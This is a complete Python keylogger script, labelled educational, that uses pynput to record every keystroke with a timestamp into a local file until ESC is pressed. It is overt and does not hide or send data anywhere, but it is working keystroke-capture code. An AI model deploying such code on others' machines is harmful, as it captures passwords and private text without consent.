#!/usr/bin/env python3
"""
Educational Keylogger - For Learning Purposes Only

Description:
This program captures keyboard inputs and stores them in a file with timestamps.
Press ESC key to stop the keylogger safely.
"""

# =========================
# IMPORT LIBRARIES
# =========================
from pynput import keyboard
import datetime
import os

# =========================
# CONFIGURATION
# =========================
LOG_FILE = "keylog.txt"
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"

# =========================
# FUNCTION: TIMESTAMP
# =========================
def get_timestamp():
    return datetime.datetime.now().strftime(TIMESTAMP_FORMAT)

# =========================
# FUNCTION: KEY PRESS
# =========================
def on_press(key):
    try:
        # Normal keys
        with open(LOG_FILE, "a") as f:
            f.write(f"[{get_timestamp()}] {key.char}\n")
    except AttributeError:
        # Special keys
        with open(LOG_FILE, "a") as f:
            f.write(f"[{get_timestamp()}] {key}\n")

# =========================
# FUNCTION: KEY RELEASE (STOP CONDITION)
# =========================
def on_release(key):
    # Stop when ESC is pressed
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped successfully.")
        return False

# =========================
# MAIN FUNCTION
# =========================
def main():
    print("Starting keylogger...")
    print("Press ESC to stop")

    # Create file if not exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write(f"Keylogger started at {get_timestamp()}\n")

    # Start listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# =========================
# ENTRY POINT
# =========================
if __name__ == "__main__":
    main()